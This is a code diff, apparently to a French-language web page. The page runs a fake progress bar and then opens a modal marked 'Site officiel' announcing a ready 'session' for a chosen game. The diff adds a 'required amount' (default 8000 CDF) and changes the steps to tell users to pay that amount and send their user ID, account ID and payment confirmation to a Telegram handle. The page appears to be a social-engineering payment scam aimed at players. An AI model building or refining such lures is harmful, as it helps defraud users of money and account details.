@@ -74,9 +74,17 @@
         <div class="modalBody">
           <p class="modalText" id="modalText">—</p>
 
+          <div class="amountPill">
+            <div class="left">
+              <div class="k">MONTANT REQUIS</div>
+              <div class="v" id="amountBig">—</div>
+            </div>
+            <div class="tag">Site officiel</div>
+          </div>
+
           <div class="modalActions">
             <button class="btn secondary" id="official">Aller au site officiel</button>
-            <button class="btn secondary" id="tg">Contacter le support (Telegram)</button>
+            <button class="btn secondary" id="tg">Envoyer sur Telegram</button>
           </div>
 
           <div class="modalHint" id="modalHint">—</div>
@@ -196,6 +204,7 @@
     const modal = document.getElementById("modal");
     const modalText = document.getElementById("modalText");
     const modalHint = document.getElementById("modalHint");
+    const amountBig = document.getElementById("amountBig");
 
     function openModal(){
       modal.classList.add("isOpen");
@@ -208,6 +217,10 @@
     document.getElementById("closeModal").addEventListener("click", closeModal);
     modal.addEventListener("click", (e)=>{ if(e.target === modal) closeModal(); });
     document.addEventListener("keydown", (e)=>{ if(e.key === "Escape") closeModal(); });
+
+    function amountText(){
+      return `${Number(A.AMOUNT || 8000).toLocaleString("fr-FR")} ${A.CURRENCY || "CDF"}`;
+    }
 
     // Start
     document.getElementById("start").addEventListener("click", ()=>{
@@ -223,17 +236,21 @@
         bar.style.width = Math.min(100, p) + "%";
         if(p >= 100){
           clearInterval(t);
+
+          const aText = amountText();
+          amountBig.textContent = aText;
+
           modalText.textContent = `✅ Session prête pour ${selected}.`;
           modalHint.textContent =
             `1) Ouvrez le site officiel\n` +
-            `2) Connectez-vous à votre compte\n` +
-            `3) Si besoin, contactez le support via Telegram.`;
+            `2) Effectuez l’opération au montant requis: ${aText}\n` +
+            `3) Envoyez votre demande/confirmation via Telegram si besoin.`;
+
           openModal();
         }
       }, 220);
     });
 
-    // Buttons
     document.getElementById("official").addEventListener("click", ()=>{
       window.open(A.OFFICIAL_URL, "_blank", "noopener,noreferrer");
     });
@@ -241,8 +258,9 @@
     document.getElementById("tg").addEventListener("click", ()=>{
       const user = sessionStorage.getItem("user") || "";
       const id = acc.value.trim() || "—";
+      const aText = amountText();
       const text = encodeURIComponent(
-        `Bonjour.\nUser: ${user}\nID: ${id}\nJeu: ${selected}\nBesoin d’assistance.`
+        `Bonjour.\nUser: ${user}\nID: ${id}\nJeu: ${selected}\nMontant requis: ${aText}\nMerci.`
       );
       window.open(`https://t.me/${A.TELEGRAM_USERNAME}?text=${text}`, "_blank", "noopener,noreferrer");
     });
